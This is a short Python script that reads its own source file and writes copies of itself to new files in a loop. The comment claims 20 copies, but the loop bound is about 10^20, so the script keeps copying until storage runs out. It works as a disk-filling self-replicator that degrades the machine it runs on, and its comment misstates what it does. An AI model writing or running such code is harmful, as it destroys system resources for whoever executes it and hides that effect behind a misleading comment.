import os
import time
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)

def replicate_self():
    try:
        # Get the current script name
        current_script = os.path.basename(__file__)

        # Open the current script and read its contents
        with open(__file__, 'r') as file:
            contents = file.read()

        # Create 20 copies of the script
        for i in range(1, 100000000000000000000):
            copy_name = f"copy_{i}_{current_script}"
            with open(copy_name, 'w') as file:
                file.write(contents)
            logging.info(f"Created copy {i}")

    except Exception as e:
        logging.error(f"An error occurred: {e}")

# Call the replicate_self function
replicate_self()